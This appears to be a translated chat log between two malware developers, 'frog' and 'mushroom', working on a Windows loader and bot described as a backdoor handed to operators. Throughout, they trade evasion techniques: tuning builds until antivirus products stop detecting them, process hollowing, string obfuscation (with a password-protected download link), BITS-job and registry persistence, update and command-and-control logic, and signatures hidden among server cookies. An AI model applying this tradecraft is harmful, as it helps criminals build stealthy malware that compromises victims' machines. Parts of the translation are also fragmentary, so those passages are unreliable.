Hi, did you clean dyncheck the loader's dynamic detects? If you did, send me links to dyncheck.

2020-08-19T11:32:31 frog -> mushroom
Hi. Haven't cleaned up yet.

Hi. Looked at what's in GitLab now

2020-08-21T09:06:16 mushroom -> frog
The system information works fine.

2020-08-21T09:06:24 mushroom -> frog
Hollowing does not work.

2020-08-21T09:06:38 mushroom -> frog
Wrong place to write.

2020-08-21T09:07:01 mushroom -> frog
Write me when you figure out the detects.

2020-08-21T09:11:15 frog -> mushroom
Hi. Do you know what the IDP.Generic detector does?

2020-08-21T09:13:25 frog -> mushroom
It comes and goes with the same file.

2020-08-21T09:16:13 mushroom -> frog
I don't know. Which antivirus has this?

2020-08-21T09:17:30 frog -> mushroom
AVG Internet Security and Avast. The 64-bit version detects

2020-08-21T09:21:53 mushroom -> frog
Is this a static detection?

2020-08-21T09:38:12 frog -> mushroom
Dynamic

2020-08-21T09:40:01 mushroom -> frog
Have you tried disabling a piece of software and checking for detects until it goes away?

2020-08-21T09:41:11 mushroom -> frog
Also see what's in the pictures of detects, there are several detects I know always because of the firewall, they don't count.

2020-08-21T09:41:11 frog -> mushroom
Sure. It just comes and goes. That's the problem.

2020-08-21T09:47:13 mushroom -> frog
Without them, how many detects?

2020-08-21T09:47:36 frog -> mushroom
Without them, how many detects?

2020-08-21T09:53:27 mushroom -> frog
Without them, how many detects?

2020-08-21T09:53:51 frog -> mushroom
2 or 3

2020-08-21T09:54:09 mushroom -> frog
Firewall?

2020-08-21T09:54:28 mushroom -> frog
Send links.

2020-08-21T09:55:28 frog -> mushroom
Checked it out yesterday:
https://dyncheck.com/scan/id/158c99f5d376565a9f8ae2bcb2be65ef

2020-08-21T09:56:50 frog -> mushroom
Avast installed, I'll try to find out what's wrong

2020-08-21T10:04:08 mushroom -> frog
It's fine. Comodo always gives detects there, it's some kind of obscure, others are firewall, they don't count.

2020-08-21T10:04:49 mushroom -> frog
In general, if you can't figure it out, give Bentley this version for testing.

2020-08-24T07:24:38 frog -> mushroom
Hi. Was dealing with dynamic detects.
It worked out like this.
64-bit version:
https://dyncheck.com/scan/id/2f83b0fde38d24eb44e0ad4dbdbd186c
32-bit version:
https://dyncheck.com/scan/id/d7dd896d903a61155799dd9ddc116ab1

2020-08-24T07:29:40 frog -> mushroom
BitDefender Total Security for some reason shows detection even on an exe-file that does nothing (except ExitProcess immediately on startup).
Dr Web doesn't know what it wants. Tried to put it on a virtual machine, it didn't ask anything at startup. But the version was something else.

2020-08-24T07:30:47 frog -> mushroom
Malwarebytes Anti-Malware sometimes asks permission to go online.

2020-08-24T07:33:15 frog -> mushroom
AVG Internet Security and Avast Internet Security did not like registry registration (IDP.Generic, which I asked about). I fixed it. These antiviruses appear to have the same engine

2020-08-24T07:35:47 frog -> mushroom
If you had access to a machine with the same DrWeb antivirus, you could try to figure it out.

2020-08-24T07:43:10 mushroom -> frog
Hi. That worked out well. Give these versions of the Bentley to the tests.

2020-08-24T07:45:12 frog -> mushroom
Okay. Asked Bentley to run it on a Windows Server 2019 machine. I'll check it just in case, just to make sure it's not like then, and then give it to the tests.
What are the IP addresses now?

2020-08-28T10:24:01 mushroom -> frog
OK.

2020-08-31T12:34:26 mushroom -> frog
Hi your group is now a 7 for the battle bot.

2020-08-31T12:34:35 mushroom -> frog
Make the change.

2020-08-31T12:34:57 mushroom -> frog
Seven is your test group on the battle server.

2020-08-31T12:35:22 frog -> mushroom
Hi. Okay

2020-08-31T12:35:57 mushroom -> frog
7 is a group for work already. You'll use it in the builds you'll give to work already.

2020-08-31T12:36:41 frog -> mushroom
You mean use "7" instead of "seven"?

2020-08-31T12:36:58 mushroom -> frog
For working versions.

2020-08-31T12:37:04 frog -> mushroom
 How did the last test go?

2020-08-31T12:37:19 mushroom -> frog
And to test seven.

2020-08-31T12:37:27 mushroom -> frog
Didn't ask.

2020-08-31T12:37:43 mushroom -> frog
You have a Bentley, find out.

2020-08-31T12:38:35 mushroom -> frog
What is your username on the battle server?

2020-08-31T12:40:13 mushroom -> frog

2020-08-31T12:41:58 frog -> mushroom
A group like this appeared.

2020-08-31T12:42:43 mushroom -> frog
Check how it works, upload files there and test it.

2020-08-31T12:45:18 mushroom -> frog

Check when group 7. If all is ok give these battle assemblies with group 7 Bentley.

2020-09-01T13:15:15 mushroom -> frog
Hi.

2020-09-01T13:15:41 mushroom -> frog
We give your backdoor to Target.

2020-09-01T13:16:16 frog -> mushroom
Hi

2020-09-01T13:16:20 mushroom -> frog
Did you do a combat build for group 7?

2020-09-01T13:16:37 frog -> mushroom
No, not yet.

2020-09-01T13:17:09 mushroom -> frog
Do it, give it to Bentley, he'll test it, fix it, and give it to Target for work.

2020-09-01T13:17:27 frog -> mushroom
Okay

2020-09-01T13:42:23 mushroom -> frog
Oh, and I forgot to tell you. Now every new build for group 7 increase version of bot and loader, and builds do three compilers MinGW, Clang, MSVC all three have the same version. Then the next day you make a new build, increase the version of all three. For example, today you have 1.5 for all, tomorrow 1.6

2020-09-01T13:44:22 mushroom -> frog
And update your projects on Gitlab to the latest stable versions you're doing, if you haven't already.

2020-09-01T13:45:51 frog -> mushroom
There are stable versions out there now. The one now sent for testing is also on gitlab.

2020-09-01T13:46:05 mushroom -> frog
Just clarifying.

2020-09-01T13:46:45 frog -> mushroom
That's the way I'm increasing the version. Wanted to wait for test results. Bently said he is still testing.

2020-09-01T13:47:28 mushroom -> frog
For group 7, increase every time you give it away.

2020-09-01T13:47:45 mushroom -> frog
For group seven however you want, it's a test one.

2020-09-01T13:49:48 frog -> mushroom
Got it all about the group.
Clang, MSVC tried to compile, everything is fine. Didn't have time to do MinGW yet, last time I tried to compile it, got lots of errors, didn't have time to fix it yet. And then I wanted to write an obfuscator for system calls. I wanted to debug it and compile it in MinGW.

2020-09-01T13:50:24 mushroom -> frog
So for now, do MSVC and Clang.

2020-09-01T13:51:30 mushroom -> frog
By the way, we have a Clang obfuscator, which obfuscates the program a lot.

2020-09-01T13:51:48 mushroom -> frog
It says so in redmine.

2020-09-01T13:54:21 frog -> mushroom
Okay, I'll take a look at it.
I wanted more advice on this. Is it possible to anchor in the system, downloading from the server to do too in mask mode. I.e. not dl7.exe itself did it, but some encrypted executable, which could be unpacked, e.g. from resource file and run in mask mode?

2020-09-01T13:55:15 frog -> mushroom
Or a PE loader that does the same thing, but in the context of its own process?

2020-09-01T13:55:59 mushroom -> frog
That's what a crypt does.

2020-09-01T13:56:43 mushroom -> frog
It's a program that your bootloader is stuffed into, it then takes it out and runs it as Hollowing for example.

2020-09-01T13:56:53 mushroom -> frog
It's the other person doing it.

2020-09-01T13:57:10 mushroom -> frog
Bentley gives him your bootloader for that.

2020-09-01T13:57:48 frog -> mushroom
Ahh... So fighting static detects is just for backup?

2020-09-01T13:57:57 mushroom -> frog
Yes.

2020-09-01T13:59:09 frog -> mushroom
Now everything is clearer. Thank you!

2020-09-01T14:02:05 mushroom -> frog
Add Buzu to your projects as Master. He's on GitLab binman.

2020-09-01T14:02:29 frog -> mushroom
Okay

2020-09-01T14:02:51 frog -> mushroom
What's his username?

2020-09-01T14:03:03 frog -> mushroom
That's it, I got it.

2020-09-01T14:03:03 mushroom -> frog
binman

2020-09-01T14:07:44 frog -> mushroom
Added

2020-09-01T14:08:00 mushroom -> frog
OK.

2020-09-01T15:50:13 mushroom -> frog
Did you give the Bentley to tests with a group 7 kit?

2020-09-01T15:50:23 mushroom -> frog
Or seven?

2020-09-01T15:50:38 frog -> mushroom
seven is still being tested

2020-09-01T15:51:53 frog -> mushroom
Eliminated dynamic detects, then tested again

2020-09-01T15:52:34 mushroom -> frog
Make it 7 at once. He will test it.

2020-09-01T15:53:54 mushroom -> frog
He'll check it and if it's okay he'll give it to you.

2020-09-01T15:55:30 mushroom -> frog
So don't wait for the tests for seven. Make one for group 7 and give it to Bentley.

2020-09-01T15:55:39 frog -> mushroom
Okay

2020-09-02T07:44:22 frog -> mushroom
Hi. Sent Bentley a set with a band "7" for testing.

2020-09-02T07:50:39 mushroom -> frog
Okay.

2020-09-03T08:48:45 mushroom -> frog
So how are the group 7 tests going?

2020-09-03T08:50:20 frog -> mushroom
Hi. Everything went fine.

2020-09-03T08:51:03 mushroom -> frog
Then now you have to make a new build every day with a version increase and give it to Bentley.

2020-09-03T08:51:31 mushroom -> frog
With all the compilers you can make at the moment.

2020-09-03T08:51:57 frog -> mushroom
Got it

2020-09-03T08:52:23 mushroom -> frog
And while you're at it, finish MinGW.

2020-09-03T08:52:58 frog -> mushroom
I'm still writing an obfuscator. There is something to do.

2020-09-03T08:55:21 frog -> mushroom
Is there any way to suppress the "invalid incomplete type" warning in the string obfuscator, do you know?

2020-09-03T08:55:49 mushroom -> frog
I don't think you can.

2020-09-03T08:56:26 mushroom -> frog
Since only strings are actually turned into encrypted arrays at compile time.

The point is to give the left address beforehand. Then this system will go to an error state and will constantly call the program we need (the loader).

2020-09-16T12:18:15 mushroom -> frog
The loader in this case should then return 1. Then the system will always call it until it returns 0.

2020-09-16T12:22:22 frog -> mushroom
Thank you. I'll look into it.

Hi, how are you doing with the detects at the moment?

2020-09-18T12:09:29 frog -> mushroom
Hi. Been testing the Bentley today. It showed up as a detector. I'm working on it now.

2020-09-18T12:10:14 mushroom -> frog
What is it called?

2020-09-18T12:11:08 frog -> mushroom
Trojan:Script/Wacatac.B!ml
Behavior:Win32/Persistence.GI!ml

2020-09-18T12:11:39 mushroom -> frog
Behavior:Win32/Persistence.GI!ml is probably because of what you write in the registry.

2020-09-18T12:13:39 frog -> mushroom
How about removing the registry entry? Leave the creation of the shortcut and the BITS jobs?

2020-09-18T12:15:05 mushroom -> frog
Try one at a time, what will remove the detector and leave it.

2020-09-18T12:24:22 mushroom -> frog
What do you have from my code in the loader? I also have Wacatac.

2020-09-18T12:36:11 frog -> mushroom
Module crypter.
emercoinResolveDns

2020-09-18T12:55:56 frog -> mushroom
Localization check.
Locating in the system.
Hook removal.
But all these modules obfuscate in my own way and I've changed them a lot. I rewrote libraryproxy in my own way.

Just to clarify. Is it the exe-file (the loader, I mean) which is launched first, or the one which is downloaded from the server and launched second must also be anchored in the system?

2020-09-18T15:10:04 mushroom -> frog
One is fixed, if another version happens to be on the server, it is downloaded and run.

2020-09-18T15:10:36 mushroom -> frog
That is, if a new one is downloaded, the old one is deleted, the new one will already fix itself.

2020-09-18T15:16:02 frog -> mushroom
And how do I record information about the antivirus? I did so:
&av=name
and so:
&av[1]=name1&av[2]=name2
But neither the first nor the second method shows me information about the antivirus when I click on "more bot info". Although the command itself has all the information.

2020-09-18T15:19:48 mushroom -> frog
&av[0]=name1&av[1]=name2&avp[0]=ver1&avp[1]=ver2

Buza also said to deal with mitigations and to do a thread start ban. Can I see some example or read about it where?

Hi, changes in the commands, the bot appeared command 18, it means to anchor in the system. It turns out the mount must be removed from the loader if you made it and transferred to the bot. It turns out so the loader passes the path to his file in the bot. And the bot if it gets the command 18 uses this path to anchor the loader in the system. Bot still can not save to disk.

2020-09-22T11:47:35 mushroom -> frog

2020-09-22T11:51:28 frog -> mushroom
Hi. Okay.

2020-09-22T12:26:00 frog -> mushroom
Were you able to figure out the cause of the Wacatac detector? I thought it was because of the string obfuscator. When I removed or shortened the obfuscated strings, it disappeared.

2020-09-22T12:27:37 mushroom -> frog
And just if you make a program with a string obfuscator and a bunch of strings there will be Wacatac?

2020-09-22T12:27:52 mushroom -> frog
Do you have Wacatac for 32 bit program only?

2020-09-22T12:28:26 mushroom -> frog
If only for 32 bit, you can score it as long as the 32 bit loader is not used.

2020-09-22T12:28:45 mushroom -> frog
Need 64 bit only clean.

2020-09-22T12:30:05 mushroom -> frog
I have Wacatac and DefenseIvasion and it's somewhere in the process of creating ProcessHollowing, as I commented out this function and there were no more detects, I uncommented it appeared.

2020-09-22T12:30:23 mushroom -> frog
And I only have this for the 64 bit bootloader.

2020-09-22T12:35:56 frog -> mushroom
I have it in the 32-bit version. Just did not try to make a program with obfuscator, but once tried to make a long line at the beginning of main function, and commented out all the other modules. So this detector didn't disappear until I deleted this line, although about 80% of the code wasn't there anymore. I also noticed that it disappeared when I commented out or shortened long lines with a list of emercoin addresses and function with lots of dll library names.

2020-09-22T12:40:50 frog -> mushroom
The obfuscator inserts a sequence of MOV calls into the code, if you look in the "Disassembled Code" window.
Maybe antivirus doesn't like it, although there's nothing illegal about it. They are just local variables, in fact.

2020-09-22T12:42:58 frog -> mushroom
Similar situation was with Fugrafa detection by BullGuard antivirus. If you comment out the obfuscator, it disappears.

2020-09-22T12:43:45 mushroom -> frog
What is the obfuscator?

2020-09-22T12:44:28 frog -> mushroom
The same one you gave me: strobfuscator.h

2020-09-22T12:47:08 mushroom -> frog
Try this one:
Download: https://qaz.im/load/zY7BSQ/fEdaH8
Delete: https://qaz.im/index.php?a=delete&q=2095202804
Password: :PV1[A<8#hC3YLWZX

2020-09-22T12:47:46 mushroom -> frog
The first character in the password is ":"

2020-09-22T12:48:08 mushroom -> frog
":PV1[A<8#hC3YLWZX

2020-09-22T12:49:00 mushroom -> frog
At the beginning of the file you write:
#ifdef OBFUSCATED_STRINGS
#include "MetaString4.h"
using namespace andrivet::ADVobfuscator;
#endif

2020-09-22T12:49:11 mushroom -> frog
_STR also works there

2020-09-22T12:49:23 mushroom -> frog
It just doesn't obfuscate unicode strings.

2020-09-22T12:52:04 frog -> mushroom
Thanks

2020-09-22T12:53:18 mushroom -> frog
Then tell me the result. If so, I'll refine stdobfuscator (put in extra obfuscation methods from this obfuscator, there's only one right now.

2020-09-22T13:03:34 mushroom -> frog
Do you do the holoving as I sent the code?

2020-09-22T13:04:11 mushroom -> frog
I've changed it now and the Wacatc and DefenseIvasion detectors don't show up.

2020-09-22T13:06:09 frog -> mushroom
It's a little different for me. Technically it's the same, but the implementation is different. I used the one Buza gave me and reworked it for the 64-bit version.

x86 is not needed. Give up the stable x64 version of Bentley.

2020-09-24T13:36:32 mushroom -> frog
Well, every day, give him the stable set. And then do all sorts of tweaks in the other branch, then merge it into the stable one.

2020-09-24T13:45:24 mushroom -> frog

2020-09-24T13:46:59 mushroom -> frog

Thank you. I'll take a look at

2020-09-24T14:02:44 frog -> mushroom
About the update I wanted to ask. If I need to update the bootloader, should I delete the old bootloader and save the new one under the name of the old one?

2020-09-24T14:03:29 mushroom -> frog
Delete the old one, download and run the new one.

2020-09-24T14:04:30 mushroom -> frog
Same as command 10 with save to disk, only at the beginning you have to remove the old bootloader.

2020-09-24T14:04:58 mushroom -> frog
That is, when the loader starts the bot, it must pass it its filename.

2020-09-24T14:05:15 mushroom -> frog
Then you can easily remove it from the bot on command.

2020-09-24T14:07:49 frog -> mushroom
Are the loaders originally saved to the Temp folder? Or another one?

2020-09-24T14:08:29 mushroom -> frog
What does that originally mean?

2020-09-24T14:08:52 mushroom -> frog
When do you download?

2020-09-24T14:09:05 frog -> mushroom
Before the very first run

2020-09-24T14:09:27 mushroom -> frog
It's not known. The user can download anywhere.

2020-09-24T14:10:11 mushroom -> frog
You can get your own name by GetModuleHandleFileName

2020-09-24T14:10:35 mushroom -> frog
That's the one you pass to the bot.

2020-09-24T14:15:40 frog -> mushroom
I.e. the one that will be copied into the Temp folder is fixed in the system? Or does the bootloader anchor itself at any startup?

2020-09-24T14:16:47 mushroom -> frog
Uploader does not fix itself anymore. It fixes the bot. It turns the downloader started downloading and running bot, and that's it.

2020-09-24T14:16:57 mushroom -> frog
Passed my name to the bot on startup.

2020-09-24T14:17:33 mushroom -> frog
The bot received command 18 and used the loader file name it knows to fix it.

2020-09-24T14:18:50 mushroom -> frog
The update works like this, the bot downloaded the bootloader, deleted the old one, started the new one and finished. The new loader will download the bot and start again. And the newly launched bot will know the file name of the new loader.

2020-09-24T14:55:24 frog -> mushroom
So the update is only run through admin? With the commands "upload loader x64"?

2020-09-24T14:59:13 mushroom -> frog
When the bootloader starts it gets the version from the admin, if it is different, it downloads, runs it and completes. If the bot gets the Force Update Now command, it downloads the file that's there, deletes the old loader, runs the downloaded file and terminates.

2020-09-24T15:01:30 mushroom -> frog
If the Force Update Now command does not have a file specified, the bot just starts the old loader and terminates.

2020-09-24T15:01:59 mushroom -> frog
No need to do all that Upload loader x86 stuff yet.

2020-09-24T15:02:11 mushroom -> frog
Only Force Update Now.

Make the loader also to be primitive, only downloads and launches without saving to disk bot.

2020-09-30T08:59:45 mushroom -> frog
You have DefenseIvasion Bentley said. It's definitely not a string obfuscator or api obfuscator. I've done the loader with and without other obfuscators altogether and the detection is there. I think it's process hollowing.

2020-09-30T10:13:47 mushroom -> frog
I have a guess here about DefenseIvasion\Wacatac. Go into project properties, general, target object name, and change the current name to something else. I've done it myself, haven't caught any more of these detects yet.

2020-09-30T10:14:29 mushroom -> frog
You also need to build a kit for group 4 regular, and for group 7 with a primitive loader, as I wrote above.

Hi. Bentley tested a few kits yesterday. 3 out of 4 are working fine, but fixing in the system in Windows 7 something didn't work. Asked him to let it run on a virtual machine. I tested it on Windows 7 at home though, it works fine

2020-10-01T10:18:35 mushroom -> frog
Got it. What's the fixation there?

2020-10-01T10:18:43 mushroom -> frog
Not BITS by any chance?

2020-10-01T11:09:08 frog -> mushroom
Both BITS and autoloading are there.

2020-10-01T11:09:59 mushroom -> frog
BITS it's always like this on Win 7. If bitsadmin sees your task and the file exists, it will run after a while.

2020-10-01T11:10:19 mushroom -> frog
It took my bootloader about 2 hours to start after he rebooted.

2020-10-01T11:10:43 mushroom -> frog
BITS doesn't start right away after a reboot.

2020-10-01T11:13:39 mushroom -> frog
And don't forget if BITS then the program should always return 1, so that BITS will always restart it.

2020-10-01T11:16:34 frog -> mushroom
Yes, that's taken into account. I don't return zero, but 1, - 1, etc. (not zero in general). Works fine. Do you have to return one?

2020-10-01T11:19:57 mushroom -> frog
Your program should return an exit code of zero. If your program does not return an exit code of zero, BITS checks the state of the job. If the program did not cancel or complete the job, BITS calls the program again after the minimum retry delay specified for the job expires.

2020-10-01T11:20:15 mushroom -> frog
Here's the description, as long as it's not 0.

2020-10-01T11:20:32 mushroom -> frog
Otherwise it will run once and that's it.

<ajrec> frog, group 41

2020-10-06T08:47:54 mushroom -> frog
Didn't do it?

2020-10-06T08:48:40 frog -> mushroom
No, only did 7 and 7. Only these were commissioned to do

2020-10-06T08:48:55 mushroom -> frog
А 4?

2020-10-06T08:49:08 mushroom -> frog
Remember I told you to make 4?

2020-10-06T08:50:35 frog -> mushroom
Yes. I was going to do it last week, but the tests did not pass Group 7 kits, so I was looking into the reasons

2020-10-06T08:50:53 mushroom -> frog
It's all sorted out. 41 is not yours.

2020-10-06T08:51:10 mushroom -> frog
Do 4 and 7. And turn in a Bentley.

2020-10-06T08:51:22 frog -> mushroom

Hi

2020-10-08T08:07:54 mushroom -> frog
Here's a refinement for both the loider and the bot. We need to make all received cookies to be checked as a signature.

2020-10-08T08:08:32 mushroom -> frog
Now a lot of cookies will come from the server, the signature will be hidden among them.

2020-10-08T08:09:22 mushroom -> frog
Comes in like this:
Set-Cookie: ohf29h1f[80h
Set-Cookie: 96302986013-08
Set-Cookie: m\poj\ojmf2j]09§h=8§y-97§fgfb§91fbp8b
Set-Cookie: h'oih'oin'oivno'vhohp98h0j[pkarnv;bka\pgj'p
Set-Cookie: nm;kn'pRH'IHJGR'onvLM'Pvj'oivwehe[8h03ghjf]0h]0fn

2020-10-08T08:10:53 mushroom -> frog
Run them all as a signature for the date, before the date is checked, no one fits, then the signature is not checked.

2020-10-08T08:11:46 mushroom -> frog
The Groups tab in the admin area now has a Cookies Names field

2020-10-08T08:12:37 mushroom -> frog
There write names for cookies (only names). At least 5 of them, separator is a new line.

2020-10-08T08:13:01 frog -> mushroom
Okay

Did you make sure all cookies are checked as a signature by the way? If you did, write in Groups tab, in Cookies Names field, names for cookies, in which will be hidden signature. At least 5, separated by a new line. In all of your groups do so.
